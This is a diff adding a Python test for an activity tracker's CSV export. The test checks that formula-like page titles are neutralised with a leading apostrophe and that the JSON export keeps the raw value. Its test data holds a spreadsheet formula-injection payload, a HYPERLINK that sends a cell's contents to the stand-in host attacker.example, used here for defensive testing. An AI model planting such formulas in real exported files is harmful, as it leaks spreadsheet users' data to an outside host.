@@ -64,6 +64,26 @@ def test_full_export_contains_activity_and_per_session_export_does_not(tmp_path,
     conn.close()
 
 
+def test_csv_export_keeps_formula_like_titles_as_text(tmp_path):
+    """A website picks its own title; Excel must not run it as a formula from the CSV."""
+    conn = connect(tmp_path / "f.db")
+    title = '=HYPERLINK("http"&":"&"//attacker.example/"&B2,"Open")'
+    ActivityRepository(conn).insert_span(
+        ActivitySpan(MIN, 2 * MIN, SpanKind.ACTIVE, "chrome.exe", "@SUM(1+1)",
+                     domain="evil.example", page_title=title)
+    )
+    repo = Repository(conn)
+    with export_activity_csv(repo, tmp_path / "a.csv").open(encoding="utf-8-sig") as f:
+        [row] = list(csv.DictReader(f))
+    assert row["page_title"] == "'" + title
+    assert row["product_name"] == "'@SUM(1+1)"
+    assert row["program"] == "chrome.exe" and row["site"] == "evil.example"
+    assert row["duration_s"] == "60.0"  # numbers are untouched
+    full = json.loads(export_json(repo, tmp_path / "a.json").read_text("utf-8"))
+    assert full["activity"]["spans"][0]["page_title"] == title  # JSON keeps the raw value
+    conn.close()
+
+
 def test_retention_removes_old_activity_and_forgets_unused_programs(tmp_path):
     conn = connect(tmp_path / "r.db")
     activity = ActivityRepository(conn)
